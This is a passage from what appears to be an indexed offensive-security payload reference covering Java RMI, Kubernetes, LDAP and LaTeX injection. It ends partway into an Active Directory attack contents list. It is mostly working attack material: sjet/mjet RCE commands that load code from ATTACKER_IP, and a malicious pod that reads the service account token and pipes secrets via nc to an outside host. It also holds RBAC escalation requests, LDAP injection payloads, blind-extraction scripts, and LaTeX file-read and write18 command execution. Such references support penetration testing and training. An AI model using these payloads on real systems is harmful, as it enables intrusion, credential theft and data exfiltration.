<li>Learn how to use JSON Web Tokens (JWT) for Authentication - @dwylhq</li> <li>Privilege Escalation like a Boss - October 27, 2018 - janijay007</li> <li>Simple JWT hacking - @b1ack_h00d</li> <li>WebSec CTF - Authorization Token - JWT Challenge</li> <li>Write up \u2013 JRR Token \u2013 LeHack 2019 - 07/07/2019 - LAPHAZE</li> </ul>"},{"location":"Java%20RMI/","title":"Java RMI","text":"<p>Exposing a weak configured Java Remote Method Invocation (RMI) service can lead to several ways to achieve RCE. One such attack is to host an MLet file and instruct the JMX service to load MBeans from the remote host which can be carried out using the tools mjet or sjet. remote-method-guesser is a more recent tool which bundles enumeration of RMI services together with a summary of currently known attack techniques.</p>"},{"location":"Java%20RMI/#summary","title":"Summary","text":"<ul> <li>Tools</li> <li>Detection</li> <li>Exploitation</li> <li>RCE using sjet/mjet</li> <li>References</li> </ul>"},{"location":"Java%20RMI/#tools","title":"Tools","text":"<ul> <li>sjet</li> <li>mjet</li> <li>remote-method-guesser</li> </ul>"},{"location":"Java%20RMI/#detection","title":"Detection","text":"<p>Using nmap: <pre><code>$ nmap -sV --script \"rmi-dumpregistry or rmi-vuln-classloader\" -p TARGET_PORT TARGET_IP -Pn -v\n1089/tcp open  java-rmi Java RMI\n| rmi-vuln-classloader:\n|   VULNERABLE:\n|   RMI registry default configuration remote code execution vulnerability\n|     State: VULNERABLE\n|       Default configuration of RMI registry allows loading classes from remote URLs which can lead to remote code execution.\n| rmi-dumpregistry:\n|   jmxrmi\n|     javax.management.remote.rmi.RMIServerImpl_Stub\n</code></pre></p> <p>Using remote-method-guesser: <pre><code>$ rmg scan 172.17.0.2 --ports 0-65535\n[+] Scanning 6225 Ports on 172.17.0.2 for RMI services.\n[+]\n[+]     [HIT] Found RMI service(s) on 172.17.0.2:40393 (DGC)\n[+]     [HIT] Found RMI service(s) on 172.17.0.2:1090  (Registry, DGC)\n[+]     [HIT] Found RMI service(s) on 172.17.0.2:9010  (Registry, Activator, DGC)\n[+]     [6234 / 6234] [#############################] 100%\n[+]\n[+] Portscan finished.\n</code></pre></p> <pre><code>$ rmg enum 172.17.0.2 9010\n[+] RMI registry bound names:\n[+]\n[+]     - plain-server2\n[+]         --&gt; de.qtc.rmg.server.interfaces.IPlainServer (unknown class)\n[+]             Endpoint: iinsecure.dev:39153 ObjID: [-af587e6:17d6f7bb318:-7ff7, 9040809218460289711]\n[+]     - legacy-service\n[+]         --&gt; de.qtc.rmg.server.legacy.LegacyServiceImpl_Stub (unknown class)\n[+]             Endpoint: iinsecure.dev:39153 ObjID: [-af587e6:17d6f7bb318:-7ffc, 4854919471498518309]\n[+]     - plain-server\n[+]         --&gt; de.qtc.rmg.server.interfaces.IPlainServer (unknown class)\n[+]             Endpoint: iinsecure.dev:39153 ObjID: [-af587e6:17d6f7bb318:-7ff8, 6721714394791464813]\n[...]\n</code></pre> <p>Using Metasploit <pre><code>use auxiliary/scanner/misc/java_rmi_server\nset RHOSTS &lt;IPs&gt;\nset RPORT &lt;PORT&gt;\nrun\n</code></pre></p>"},{"location":"Java%20RMI/#exploitation","title":"Exploitation","text":""},{"location":"Java%20RMI/#rce-using-sjet-or-mjet","title":"RCE using sjet or mjet","text":""},{"location":"Java%20RMI/#requirements","title":"Requirements","text":"<ul> <li>Jython</li> <li>The JMX server can connect to a http service that is controlled by the attacker</li> <li>JMX authentication is not enabled</li> </ul>"},{"location":"Java%20RMI/#remote-command-execution","title":"Remote Command Execution","text":"<p>The attack involves the following steps: * Starting a web server that hosts the MLet and a JAR file with the malicious MBeans * Creating a instance of the MBean javax.management.loading.MLet on the target server, using JMX * Invoking the \"getMBeansFromURL\" method of the MBean instance, passing the webserver URL as parameter. The JMX service will connect to the http server and parse the MLet file. * The JMX service downloads and loades the JAR files that were referenced in the MLet file, making the malicious MBean available over JMX. * The attacker finally invokes methods from the malicious MBean.</p> <p>Exploit the JMX using sjet or mjet</p> <pre><code>jython sjet.py TARGET_IP TARGET_PORT super_secret install http://ATTACKER_IP:8000 8000\njython sjet.py TARGET_IP TARGET_PORT super_secret command \"ls -la\"\njython sjet.py TARGET_IP TARGET_PORT super_secret shell\njython sjet.py TARGET_IP TARGET_PORT super_secret password this-is-the-new-password\njython sjet.py TARGET_IP TARGET_PORT super_secret uninstall\njython mjet.py --jmxrole admin --jmxpassword adminpassword TARGET_IP TARGET_PORT deserialize CommonsCollections6 \"touch /tmp/xxx\"\njython mjet.py TARGET_IP TARGET_PORT install super_secret http://ATTACKER_IP:8000 8000\njython mjet.py TARGET_IP TARGET_PORT command super_secret \"whoami\"\njython mjet.py TARGET_IP TARGET_PORT command super_secret shell\n</code></pre>"},{"location":"Java%20RMI/#rce-using-metasploit","title":"RCE using Metasploit","text":"<pre><code>use exploit/multi/misc/java_rmi_server\nset RHOSTS &lt;IPs&gt;\nset RPORT &lt;PORT&gt;\n# configure also the payload if needed\nrun\n</code></pre>"},{"location":"Java%20RMI/#references","title":"References","text":"<ul> <li>ATTACKING RMI BASED JMX SERVICES - HANS-MARTIN M\u00dcNCH, 28 April 2019</li> <li>JMX RMI \u2013 MULTIPLE APPLICATIONS RCE - Red Timmy Security, 26 March 2019</li> <li>remote-method-guesser - BHUSA 2021 Arsenal - Tobias Neitzel, 15 August 2021</li> </ul>"},{"location":"Kubernetes/","title":"Kubernetes","text":"<p>Kubernetes is an open-source container-orchestration system for automating application deployment, scaling, and management. It was originally designed by Google, and is now maintained by the Cloud Native Computing Foundation.</p>"},{"location":"Kubernetes/#summary","title":"Summary","text":"<ul> <li>Tools</li> <li>Container Environment</li> <li>Information Gathering</li> <li>RBAC Configuration<ul> <li>Listing Secrets</li> <li>Access Any Resource or Verb</li> <li>Pod Creation</li> <li>Privilege to Use Pods/Exec</li> <li>Privilege to Get/Patch Rolebindings</li> <li>Impersonating a Privileged Account</li> </ul> </li> <li>Privileged Service Account Token</li> <li>Interesting endpoints to reach</li> <li>API addresses that you should know</li> <li>References</li> </ul>"},{"location":"Kubernetes/#tools","title":"Tools","text":"<ul> <li>kubeaudit - Audit Kubernetes clusters against common security concerns</li> <li>kubesec.io - Security risk analysis for Kubernetes resources</li> <li>kube-bench - Checks whether Kubernetes is deployed securely by running CIS Kubernetes Benchmark</li> <li>kube-hunter - Hunt for security weaknesses in Kubernetes clusters </li> <li>katacoda - Learn Kubernetes using interactive broser-based scenarios</li> <li>kubescape - Automate Kubernetes cluster scans to identify security issues</li> </ul>"},{"location":"Kubernetes/#container-environment","title":"Container Environment","text":"<p>Containers within a Kubernetes cluster automatically have certain information made available to them through their container environment. Additional information may have been made available through the volumes, environment variables, or the downward API, but this section covers only what is made available by default.</p>"},{"location":"Kubernetes/#service-account","title":"Service Account","text":"<p>Each Kubernetes pod is assigned a service account for accessing the Kubernetes API. The service account, in addition to the current namespace and Kubernetes SSL certificate, are made available via a mounted read-only volume:</p> <pre><code>/var/run/secrets/kubernetes.io/serviceaccount/token\n/var/run/secrets/kubernetes.io/serviceaccount/namespace\n/var/run/secrets/kubernetes.io/serviceaccount/ca.crt\n</code></pre> <p>If the <code>kubectl</code> utility is installed in the container, it will use this service account automatically and will make interacting with the cluster much easier. If not, the contents of the <code>token</code> and <code>namespace</code> files can be used to make HTTP API requests directly.</p>"},{"location":"Kubernetes/#environment-variables","title":"Environment Variables","text":"<p>The <code>KUBERNETES_SERVICE_HOST</code> and <code>KUBERNETES_SERVICE_PORT</code> environment variables are automatically provided to the container. They contain the IP address and port number of the Kubernetes master node.  If <code>kubectl</code> is installed, it will use these values automatically. If not, the values can be used to determine the correct IP address to send API requests to.</p> <pre><code>KUBERNETES_SERVICE_HOST=192.168.154.228\nKUBERNETES_SERVICE_PORT=443\n</code></pre> <p>Additionally, environment variables are automatically created for each Kubernetes service running in the current namespace when the container was created.  The environment variables are named using two patterns:</p> <ul> <li>A simplified <code>{SVCNAME}_SERVICE_HOST</code> and <code>{SVCNAME}_SERVICE_PORT</code> contain the IP address and default port number for the service.</li> <li>A Docker links collection of variables named <code>{SVCNAME}_PORT_{NUM}_{PROTOCOL}_{PROTO|PORT|ADDR}</code> for each port the service exposes.</li> </ul> <p>For example, all of the following environment variables would be available if a <code>redis-master</code> service were running with port 6379 exposed:</p> <pre><code>REDIS_MASTER_SERVICE_HOST=10.0.0.11\nREDIS_MASTER_SERVICE_PORT=6379\nREDIS_MASTER_PORT=tcp://10.0.0.11:6379\nREDIS_MASTER_PORT_6379_TCP=tcp://10.0.0.11:6379\nREDIS_MASTER_PORT_6379_TCP_PROTO=tcp\nREDIS_MASTER_PORT_6379_TCP_PORT=6379\nREDIS_MASTER_PORT_6379_TCP_ADDR=10.0.0.11\n</code></pre>"},{"location":"Kubernetes/#simulating-kubectl-api-requests","title":"Simulating <code>kubectl</code> API Requests","text":"<p>Most containers within a Kubernetes cluster won't have the <code>kubectl</code> utility installed. If running the one-line <code>kubectl</code> installer within the container isn't an option, you may need to craft Kubernetes HTTP API requests manually. This can be done by using <code>kubectl</code> locally to determine the correct API request to send from the container.</p> <ol> <li>Run the desired command at the maximum verbosity level using <code>kubectl -v9 ...</code></li> <li>The output will include HTTP API endpoint URL, the request body, and an example curl command.</li> <li>Replace the endpoint URL's hostname and port with the <code>KUBERNETES_SERVICE_HOST</code> and <code>KUBERNETES_SERVICE_PORT</code> values from the container's environment variables.</li> <li>Replace the masked \"Authorization: Bearer\" token value with the contents of <code>/var/run/secrets/kubernetes.io/serviceaccount/token</code> from the container.</li> <li>If the request had a body, ensure the \"Content-Type: application/json\" header is included and send the request body using the customary method (for curl, use the <code>--data</code> flag).</li> </ol> <p>For example, this output was used to create the Service Account Permissions request:</p> <pre><code># NOTE: only the Authorization and Content-Type headers are required. The rest can be omitted.\n$ kubectl -v9 auth can-i --list\nI1028 18:58:38.192352   76118 loader.go:359] Config loaded from file /home/example/.kube/config\nI1028 18:58:38.193847   76118 request.go:942] Request Body: {\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\nI1028 18:58:38.193912   76118 round_trippers.go:419] curl -k -v -XPOST  -H \"Accept: application/json, */*\" -H \"Content-Type: application/json\" -H \"User-Agent: kubectl/v1.14.10 (linux/amd64) kubernetes/f5757a1\" 'https://1.2.3.4:5678/apis/authorization.k8s.io/v1/selfsubjectrulesreviews'\nI1028 18:58:38.295722   76118 round_trippers.go:438] POST https://1.2.3.4:5678/apis/authorization.k8s.io/v1/selfsubjectrulesreviews 201 Created in 101 milliseconds\nI1028 18:58:38.295760   76118 round_trippers.go:444] Response Headers:\n...\n</code></pre>"},{"location":"Kubernetes/#information-gathering","title":"Information Gathering","text":""},{"location":"Kubernetes/#service-account-permissions","title":"Service Account Permissions","text":"<p>The default service account may have been granted additional permissions that make cluster compromise or lateral movement easier. The following can be used to determine the service account's permissions:</p> <pre><code># Namespace-level permissions using kubectl\nkubectl auth can-i --list\n# Cluster-level permissions using kubectl\nkubectl auth can-i --list --namespace=kube-system\n# Permissions list using curl\nNAMESPACE=$(cat \"/var/run/secrets/kubernetes.io/serviceaccount/namespace\")\n# For cluster-level, use NAMESPACE=\"kube-system\" instead\nMASTER_URL=\"https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}\"\nTOKEN=$(cat \"/var/run/secrets/kubernetes.io/serviceaccount/token\")\ncurl \"${MASTER_URL}/apis/authorization.k8s.io/v1/selfsubjectrulesreviews\" \\\n--cacert \"/var/run/secrets/kubernetes.io/serviceaccount/ca.crt\" \\\n--header \"Authorization: Bearer ${TOKEN}\" \\\n--header \"Content-Type: application/json\" \\\n--data '{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"spec\":{\"namespace\":\"'${NAMESPACE}'\"}}'\n</code></pre>"},{"location":"Kubernetes/#secrets-configmaps-and-volumes","title":"Secrets, ConfigMaps, and Volumes","text":"<p>Kubernetes provides Secrets and ConfigMaps as a way to load configuration into containers at runtime. While they may not lead directly to whole cluster compromise, the information they contain can lead to individual service compromise or enable lateral movement within a cluster.</p> <p>From a container perspective, Kubernetes Secrets and ConfigMaps are identical. Both can be loaded into environment variables or mounted as volumes. It's not possible to determine if an environment variable was loaded from a Secret/ConfigMap, so each environment variable will need to be manually inspected. When mounted as a volume, Secrets/ConfigMaps are always mounted as read-only tmpfs filesystems. You can quickly find these with <code>grep -F \"tmpfs ro\" /etc/mtab</code>.</p> <p>True Kubernetes Volumes are typically used as shared storage or for persistent storage across restarts. These are typically mounted as ext4 filesystems and can be identified with <code>grep -wF \"ext4\" /etc/mtab</code>.</p>"},{"location":"Kubernetes/#privileged-containers","title":"Privileged Containers","text":"<p>Kubernetes supports a wide range of security contexts for container and pod execution. The most important of these is the \"privileged\" security policy which makes the host node's devices available under the container's <code>/dev</code> directory. This means having access to the host's Docker socket file (allowing arbitrary container actions) in addition to the host's root disks (which can be used to escape the container entirely).</p> <p>While there is no official way to check for privileged mode from within a container, checking if <code>/dev/kmsg</code> exists will usually suffice.</p>"},{"location":"Kubernetes/#rbac-configuration","title":"RBAC Configuration","text":""},{"location":"Kubernetes/#listing-secrets","title":"Listing Secrets","text":"<p>An attacker that gains access to list secrets in the cluster can use the following curl commands to get all secrets in \"kube-system\" namespace.</p> <pre><code>curl -v -H \"Authorization: Bearer &lt;jwt_token&gt;\" https://&lt;master_ip&gt;:&lt;port&gt;/api/v1/namespaces/kube-system/secrets/\n</code></pre>"},{"location":"Kubernetes/#access-any-resource-or-verb","title":"Access Any Resource or Verb","text":"<pre><code>resources:\n- '*'\nverbs:\n- '*'\n</code></pre>"},{"location":"Kubernetes/#pod-creation","title":"Pod Creation","text":"<p>Check your right with <code>kubectl get role system:controller:bootstrap-signer -n kube-system -o yaml</code>. Then create a malicious pod.yaml file.</p> <pre><code>apiVersion: v1\nkind: Pod\nmetadata:\nname: alpine\nnamespace: kube-system\nspec:\ncontainers:\n- name: alpine\nimage: alpine\ncommand: [\"/bin/sh\"]\nargs: [\"-c\", 'apk update &amp;&amp; apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H \"Authorization: Bearer $TOKEN\" -H \"Content-Type: application/json\" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']\nserviceAccountName: bootstrap-signer\nautomountServiceAccountToken: true\nhostNetwork: true\n</code></pre> <p>Then <code>kubectl apply -f malicious-pod.yaml</code></p>"},{"location":"Kubernetes/#privilege-to-use-podsexec","title":"Privilege to Use Pods/Exec","text":"<pre><code>kubectl exec -it &lt;POD NAME&gt; -n &lt;PODS NAMESPACE&gt; \u2013- sh\n</code></pre>"},{"location":"Kubernetes/#privilege-to-getpatch-rolebindings","title":"Privilege to Get/Patch Rolebindings","text":"<p>The purpose of this JSON file is to bind the admin \"CluserRole\" to the compromised service account.  Create a malicious RoleBinging.json file.</p> <pre><code>{\n\"apiVersion\": \"rbac.authorization.k8s.io/v1\",\n\"kind\": \"RoleBinding\",\n\"metadata\": {\n\"name\": \"malicious-rolebinding\",\n\"namespcaes\": \"default\"\n},\n\"roleRef\": {\n\"apiGroup\": \"*\",\n\"kind\": \"ClusterRole\",\n\"name\": \"admin\"\n},\n\"subjects\": [\n{\n\"kind\": \"ServiceAccount\",\n\"name\": \"sa-comp\"\n\"namespace\": \"default\"\n}\n]\n}\n</code></pre> <pre><code>curl -k -v -X POST -H \"Authorization: Bearer &lt;JWT TOKEN&gt;\" -H \"Content-Type: application/json\" https://&lt;master_ip&gt;:&lt;port&gt;/apis/rbac.authorization.k8s.io/v1/namespaces/default/rolebindings -d @malicious-RoleBinging.json\ncurl -k -v -X POST -H \"Authorization: Bearer &lt;COMPROMISED JWT TOKEN&gt;\" -H \"Content-Type: application/json\" https://&lt;master_ip&gt;:&lt;port&gt;/api/v1/namespaces/kube-system/secret\n</code></pre>"},{"location":"Kubernetes/#impersonating-a-privileged-account","title":"Impersonating a Privileged Account","text":"<pre><code>curl -k -v -XGET -H \"Authorization: Bearer &lt;JWT TOKEN (of the impersonator)&gt;\" -H \"Impersonate-Group: system:masters\" -H \"Impersonate-User: null\" -H \"Accept: application/json\" https://&lt;master_ip&gt;:&lt;port&gt;/api/v1/namespaces/kube-system/secrets/\n</code></pre>"},{"location":"Kubernetes/#privileged-service-account-token","title":"Privileged Service Account Token","text":"<pre><code>$ cat /run/secrets/kubernetes.io/serviceaccount/token\n$ curl -k -v -H \"Authorization: Bearer &lt;jwt_token&gt;\" https://&lt;master_ip&gt;:&lt;port&gt;/api/v1/namespaces/default/secrets/\n</code></pre>"},{"location":"Kubernetes/#interesting-endpoints-to-reach","title":"Interesting endpoints to reach","text":"<pre><code># List Pods\ncurl -v -H \"Authorization: Bearer &lt;jwt_token&gt;\" https://&lt;master_ip&gt;:&lt;port&gt;/api/v1/namespaces/default/pods/\n# List secrets\ncurl -v -H \"Authorization: Bearer &lt;jwt_token&gt;\" https://&lt;master_ip&gt;:&lt;port&gt;/api/v1/namespaces/default/secrets/\n# List deployments\ncurl -v -H \"Authorization: Bearer &lt;jwt_token&gt;\" https://&lt;master_ip:&lt;port&gt;/apis/extensions/v1beta1/namespaces/default/deployments\n# List daemonsets\ncurl -v -H \"Authorization: Bearer &lt;jwt_token&gt;\" https://&lt;master_ip:&lt;port&gt;/apis/extensions/v1beta1/namespaces/default/daemonsets\n</code></pre>"},{"location":"Kubernetes/#api-addresses-that-you-should-know","title":"API addresses that you should know","text":"<p>(External network visibility)</p>"},{"location":"Kubernetes/#cadvisor","title":"cAdvisor","text":"<pre><code>curl -k https://&lt;IP Address&gt;:4194\n</code></pre>"},{"location":"Kubernetes/#insecure-api-server","title":"Insecure API server","text":"<pre><code>curl -k https://&lt;IP Address&gt;:8080\n</code></pre>"},{"location":"Kubernetes/#secure-api-server","title":"Secure API Server","text":"<pre><code>curl -k https://&lt;IP Address&gt;:(8|6)443/swaggerapi\ncurl -k https://&lt;IP Address&gt;:(8|6)443/healthz\ncurl -k https://&lt;IP Address&gt;:(8|6)443/api/v1\n</code></pre>"},{"location":"Kubernetes/#etcd-api","title":"etcd API","text":"<pre><code>curl -k https://&lt;IP address&gt;:2379\ncurl -k https://&lt;IP address&gt;:2379/version\netcdctl --endpoints=http://&lt;MASTER-IP&gt;:2379 get / --prefix --keys-only\n</code></pre>"},{"location":"Kubernetes/#kubelet-api","title":"Kubelet API","text":"<pre><code>curl -k https://&lt;IP address&gt;:10250\ncurl -k https://&lt;IP address&gt;:10250/metrics\ncurl -k https://&lt;IP address&gt;:10250/pods\n</code></pre>"},{"location":"Kubernetes/#kubelet-read-only","title":"kubelet (Read only)","text":"<pre><code>curl -k https://&lt;IP Address&gt;:10255\nhttp://&lt;external-IP&gt;:10255/pods\n</code></pre>"},{"location":"Kubernetes/#references","title":"References","text":"<ul> <li>Kubernetes Pentest Methodology Part 1 - by Or Ida on August 8, 2019</li> <li>Kubernetes Pentest Methodology Part 2 - by Or Ida on September 5, 2019</li> <li>Kubernetes Pentest Methodology Part 3 - by Or Ida on November 21, 2019</li> <li>Capturing all the flags in BSidesSF CTF by pwning our infrastructure - Hackernoon</li> <li>Kubernetes Pod Privilege Escalation</li> </ul>"},{"location":"LDAP%20Injection/","title":"LDAP Injection","text":"<p>LDAP Injection is an attack used to exploit web based applications that construct LDAP statements based on user input. When an application fails to properly sanitize user input, it's possible to modify LDAP statements using a local proxy.</p>"},{"location":"LDAP%20Injection/#summary","title":"Summary","text":"<ul> <li>Exploitation</li> <li>Payloads</li> <li>Blind Exploitation</li> <li>Defaults attributes</li> <li>Exploiting userPassword attribute</li> <li>Scripts</li> <li>Discover valid LDAP fields</li> <li>Special blind LDAP injection</li> </ul>"},{"location":"LDAP%20Injection/#exploitation","title":"Exploitation","text":"<p>Example 1.</p> <pre><code>user  = *)(uid=*))(|(uid=*\npass  = password\nquery = (&amp;(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))\n</code></pre> <p>Example 2</p> <pre><code>user  = admin)(!(&amp;(1=0\npass  = q))\nquery = (&amp;(uid=admin)(!(&amp;(1=0)(userPassword=q))))\n</code></pre>"},{"location":"LDAP%20Injection/#payloads","title":"Payloads","text":"<pre><code>*\n*)(&amp;\n*))%00\n)(cn=))\\x00\n*()|%26'\n*()|&amp;'\n*(|(mail=*))\n*(|(objectclass=*))\n*)(uid=*))(|(uid=*\n*/*\n*|\n/\n//\n//*\n@*\n|\nadmin*\nadmin*)((|userpassword=*)\nadmin*)((|userPassword=*)\nx' or name()='username' or 'x'='y\n</code></pre>"},{"location":"LDAP%20Injection/#blind-exploitation","title":"Blind Exploitation","text":"<p>We can extract using a bypass login</p> <pre><code>(&amp;(sn=administrator)(password=*))    : OK\n(&amp;(sn=administrator)(password=A*))   : KO\n(&amp;(sn=administrator)(password=B*))   : KO\n...\n(&amp;(sn=administrator)(password=M*))   : OK\n(&amp;(sn=administrator)(password=MA*))  : KO\n(&amp;(sn=administrator)(password=MB*))  : KO\n...\n(&amp;(sn=administrator)(password=MY*))  : OK\n(&amp;(sn=administrator)(password=MYA*)) : KO\n(&amp;(sn=administrator)(password=MYB*)) : KO\n(&amp;(sn=administrator)(password=MYC*)) : KO\n...\n(&amp;(sn=administrator)(password=MYK*)) : OK\n(&amp;(sn=administrator)(password=MYKE)) : OK\n</code></pre>"},{"location":"LDAP%20Injection/#defaults-attributes","title":"Defaults attributes","text":"<p>Can be used in an injection like <code>*)(ATTRIBUTE_HERE=*</code></p> <pre><code>userPassword\nsurname\nname\ncn\nsn\nobjectClass\nmail\ngivenName\ncommonName\n</code></pre>"},{"location":"LDAP%20Injection/#exploiting-userpassword-attribute","title":"Exploiting userPassword attribute","text":"<p><code>userPassword</code> attribute is not a string like the <code>cn</code> attribute for example but it\u2019s an OCTET STRING In LDAP, every object, type, operator etc. is referenced by an OID : octetStringOrderingMatch (OID 2.5.13.18).</p> <p>octetStringOrderingMatch (OID 2.5.13.18): An ordering matching rule that will perform a bit-by-bit comparison (in big endian ordering) of two octet string values until a difference is found. The first case in which a zero bit is found in one value but a one bit is found in another will cause the value with the zero bit to be considered less than the value with the one bit.</p> <pre><code>userPassword:2.5.13.18:=\\xx (\\xx is a byte)\nuserPassword:2.5.13.18:=\\xx\\xx\nuserPassword:2.5.13.18:=\\xx\\xx\\xx\n</code></pre>"},{"location":"LDAP%20Injection/#scripts","title":"Scripts","text":""},{"location":"LDAP%20Injection/#discover-valid-ldap-fields","title":"Discover valid LDAP fields","text":"<pre><code>#!/usr/bin/python3\nimport requests\nimport string\nfields = []\nurl = 'https://URL.com/'\nf = open('dic', 'r') #Open the wordlists of common attributes\nwordl = f.read().split('\\n')\nf.close()\nfor i in wordl:\nr = requests.post(url, data = {'login':'*)('+str(i)+'=*))\\x00', 'password':'bla'}) #Like (&amp;(login=*)(ITER_VAL=*))\\x00)(password=bla))\nif 'TRUE CONDITION' in r.text:\nfields.append(str(i))\nprint(fields)\n</code></pre> <p>Ref. [5][5]</p>"},{"location":"LDAP%20Injection/#special-blind-ldap-injection-without","title":"Special blind LDAP injection (without \"*\")","text":"<pre><code>#!/usr/bin/python3\nimport requests, string\nalphabet = string.ascii_letters + string.digits + \"_@{}-/()!\\\"$%=^[]:;\"\nflag = \"\"\nfor i in range(50):\nprint(\"[i] Looking for number \" + str(i))\nfor char in alphabet:\nr = requests.get(\"http://ctf.web?action=dir&amp;search=admin*)(password=\" + flag + char)\nif (\"TRUE CONDITION\" in r.text):\nflag += char\nprint(\"[+] Flag: \" + flag)\nbreak\n</code></pre> <p>Ref. [5][5]</p> <pre><code>#!/usr/bin/env ruby\nrequire 'net/http'\nalphabet = [*'a'..'z', *'A'..'Z', *'0'..'9'] + '_@{}-/()!\"$%=^[]:;'.split('')\nflag = ''\n(0..50).each do |i|\nputs(\"[i] Looking for number #{i}\")\nalphabet.each do |char|\nr = Net::HTTP.get(URI(\"http://ctf.web?action=dir&amp;search=admin*)(password=#{flag}#{char}\"))\nif /TRUE CONDITION/.match?(r)\nflag += char\nputs(\"[+] Flag: #{flag}\")\nbreak\nend\nend\nend\n</code></pre> <p>By noraj</p>"},{"location":"LDAP%20Injection/#references","title":"References","text":"<ul> <li>OWASP LDAP Injection</li> <li>LDAP Blind Explorer</li> <li>ECW 2018 : Write Up - AdmYSsion (WEB - 50) - 0xUKN</li> <li>Quals ECW 2018 - Maki</li> <li>How To Manage and Use LDAP Servers with OpenLDAP Utilities</li> <li>How To Configure OpenLDAP and Perform Administrative LDAP Tasks</li> <li>SSH key authentication via LDAP<ul> <li>How to setup LDAP server for openssh-lpk</li> <li>openssh-lpk.ldif</li> <li>Setting up OpenLDAP server with OpenSSH-LPK on Ubuntu 14.04</li> <li>SSH key authentication using LDAP</li> <li>[FR] SSH et LDAP</li> <li>SSH Public Keys in OpenLDAP</li> </ul> </li> </ul>"},{"location":"LaTeX%20Injection/","title":"LaTex Injection","text":""},{"location":"LaTeX%20Injection/#read-file","title":"Read file","text":"<p>Read file and interpret the LaTeX code in it:</p> <pre><code>\\input{/etc/passwd}\n\\include{somefile} # load .tex file (somefile.tex)\n</code></pre> <p>Read single lined file:</p> <pre><code>\\newread\\file\n\\openin\\file=/etc/issue\n\\read\\file to\\line\n\\text{\\line}\n\\closein\\file\n</code></pre> <p>Read multiple lined file:</p> <pre><code>\\newread\\file\n\\openin\\file=/etc/passwd\n\\loop\\unless\\ifeof\\file\n\\read\\file to\\fileline\n\\text{\\fileline}\n\\repeat\n\\closein\\file\n</code></pre> <p>Read text file, without interpreting the content, it will only paste raw file content:</p> <pre><code>\\usepackage{verbatim}\n\\verbatiminput{/etc/passwd}\n</code></pre> <p>If injection point is past document header (<code>\\usepackage</code> cannot be used), some control  characters can be deactivated in order to use <code>\\input</code> on file containing <code>$</code>, <code>#</code>,  <code>_</code>, <code>&amp;</code>, null bytes, ... (eg. perl scripts).</p> <pre><code>\\catcode `\\$=12\n\\catcode `\\#=12\n\\catcode `\\_=12\n\\catcode `\\&amp;=12\n\\input{path_to_script.pl}\n</code></pre>"},{"location":"LaTeX%20Injection/#write-file","title":"Write file","text":"<p>Write single lined file:</p> <pre><code>\\newwrite\\outfile\n\\openout\\outfile=cmd.tex\n\\write\\outfile{Hello-world}\n\\write\\outfile{Line 2}\n\\write\\outfile{I like trains}\n\\closeout\\outfile\n</code></pre>"},{"location":"LaTeX%20Injection/#command-execution","title":"Command execution","text":"<p>The output of the command will be redirected to stdout, therefore you need to use a temp file to get it.</p> <pre><code>\\immediate\\write18{id &gt; output}\n\\input{output}\n</code></pre> <p>If you get any LaTex error, consider using base64 to get the result without bad characters (or use <code>\\verbatiminput</code>):</p> <pre><code>\\immediate\\write18{env | base64 &gt; test.tex}\n\\input{text.tex}\n</code></pre> <pre><code>\\input|ls|base64\n\\input{|\"/bin/hostname\"}\n</code></pre>"},{"location":"LaTeX%20Injection/#cross-site-scripting","title":"Cross Site Scripting","text":"<p>From @EdOverflow </p> <pre><code>\\url{javascript:alert(1)}\n\\href{javascript:alert(1)}{placeholder}\n</code></pre> <p>Live example at <code>http://payontriage.com/xss.php?xss=$\\href{javascript:alert(1)}{Frogs%20find%20bugs}$</code></p>"},{"location":"LaTeX%20Injection/#references","title":"References","text":"<ul> <li>Hacking with LaTeX - Sebastian Neef - 0day.work</li> <li>Latex to RCE, Private Bug Bounty Program - Yasho</li> <li>Pwning coworkers thanks to LaTeX</li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/","title":"Active Directory Attacks","text":""},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#summary","title":"Summary","text":"<ul> <li>Active Directory Attacks</li> <li>Summary</li> <li>Tools</li> <li>Kerberos Clock Synchronization</li> <li>Active Directory Recon<ul> <li>Using BloodHound</li> <li>Using PowerView</li> <li>Using AD Module</li> </ul> </li> <li>From CVE to SYSTEM shell on DC<ul> <li>MS14-068 Checksum Validation</li> <li>ZeroLogon</li> <li>PrintNightmare</li> <li>samAccountName spoofing</li> </ul> </li> <li>Open Shares</li> <li>SCF and URL file attack against writeable share<ul> <li>SCF Files</li> <li>URL Files</li> <li>Windows Library Files</li> <li>Windows Search Connectors Files</li> </ul> </li> <li>Passwords in SYSVOL &amp; Group Policy Preferences</li> <li>Exploit Group Policy Objects GPO<ul> <li>Find vulnerable GPO</li> <li>Abuse GPO with SharpGPOAbuse</li> <li>Abuse GPO with PowerGPOAbuse</li> <li>Abuse GPO with pyGPOAbuse</li> <li>Abuse GPO with PowerView</li> <li>Abuse GPO with StandIn</li> </ul> </li> <li>Dumping AD Domain Credentials<ul> <li>Using ndtsutil</li> <li>Using Vshadow</li> <li>Using vssadmin</li> <li>Using DiskShadow (a Windows signed binary)</li> <li>Using esentutl.exe</li> <li>Extract hashes from ntds.dit</li> <li>Alternatives - modules</li> <li>Using Mimikatz DCSync</li> <li>Using Mimikatz sekurlsa</li> <li>Crack NTLM hashes with hashcat</li> <li>NTDS Reversible Encryption</li> </ul> </li> <li>User Hunting</li> <li>Password spraying<ul> <li>Kerberos pre-auth bruteforcing</li> <li>Spray a pre-generated passwords list</li> <li>Spray passwords against the RDP service</li> <li>BadPwdCount attribute</li> </ul> </li> <li>Password in AD User comment</li> <li>Password of Pre-Created Computer Account</li> <li>Reading LAPS Password</li> <li>Reading GMSA Password</li> <li>Forging Golden GMSA</li> <li>Kerberos Tickets<ul> <li>Dump Kerberos Tickets</li> <li>Replay Kerberos Tickets</li> <li>Convert Kerberos Tickets</li> <li>Pass-the-Ticket Golden Tickets</li> <li>Using Mimikatz</li> 